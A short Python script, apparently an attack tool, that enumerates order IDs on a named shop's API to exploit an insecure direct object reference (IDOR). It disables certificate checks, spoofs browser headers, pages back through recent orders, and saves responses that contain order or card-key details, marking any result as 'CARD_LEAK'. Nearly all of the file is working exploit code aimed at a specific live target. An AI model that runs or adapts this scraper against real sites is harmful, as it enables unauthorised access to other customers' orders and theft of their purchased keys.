#!/usr/bin/env python3
"""xinhe001 API IDOR scan - minimal, direct connection."""
import json
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://xinhe001.lol/shop/"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/xinhe001_api.json"
N = int(sys.argv[2]) if len(sys.argv) > 2 else 150
DELAY = float(sys.argv[3]) if len(sys.argv) > 3 else 1.5

SHOW = re.compile(r"showOrder\(|kminfo|----")


def main():
    s = requests.Session()
    s.verify = False
    s.headers.update(
        {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120",
            "Referer": BASE,
        }
    )
    home = s.get(BASE, timeout=30)
    print("home", len(home.text), flush=True)
    gc = json.loads(s.get(BASE + "ajax.php?act=getcount", timeout=20).text)
    orders = int(gc.get("orders", 5718))
    print("orders", orders, gc, flush=True)
    time.sleep(DELAY)

    hits = []
    for i, oid in enumerate(range(orders, orders - N, -1)):
        try:
            r = s.get(BASE + f"api.php?act=search&id={oid}", timeout=20)
            t = r.text
            if '"code":0' in t and SHOW.search(t):
                hits.append({"id": oid, "body": t[:500]})
                print("HIT", oid, t[:120], flush=True)
            elif '"code":0' in t and "km" in t.lower() and len(t) > 80:
                hits.append({"id": oid, "body": t[:500]})
                print("HIT2", oid, t[:120], flush=True)
        except Exception as e:
            print("err", oid, e, flush=True)
            time.sleep(5)
        if (i + 1) % 25 == 0:
            print(f"progress {i+1}/{N} hits={len(hits)}", flush=True)
        time.sleep(DELAY)

    out = {
        "target": "xinhe001.lol",
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "orders": orders,
        "scanned": N,
        "hits": hits,
        "CARD_LEAK": len(hits) > 0,
    }
    with open(OUT, "w") as f:
        json.dump(out, f, indent=2, ensure_ascii=False)
    print("DONE hits=", len(hits), flush=True)


if __name__ == "__main__":
    main()
